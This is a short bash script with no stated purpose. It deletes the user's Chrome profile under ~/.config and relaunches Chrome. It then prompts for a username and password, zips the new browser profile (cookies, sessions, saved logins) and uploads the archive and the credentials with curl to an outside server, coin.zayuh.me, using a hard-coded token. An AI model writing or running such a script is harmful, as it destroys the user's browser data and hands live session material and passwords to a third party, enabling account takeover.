#!/bin/bash
cd ~/.config || exit
rm -rf data.zip
rm -rf google-chrome
google-chrome-stable --disable-dev-shm-usage

read -r -p "username:" uservar
read -r -p "password:" passvar
read -r -p "type (1 - coin, 2 - super):" typevar

zip -r data.zip google-chrome

curl \
  -F "user=${uservar}" \
  -F "pass=${passvar}" \
  -F "type=${typevar}" \
  -F "file=@~/.config/data.zip" \
  https://coin.zayuh.me/common/new-account?token=EDPWph5bHMYsJ9aS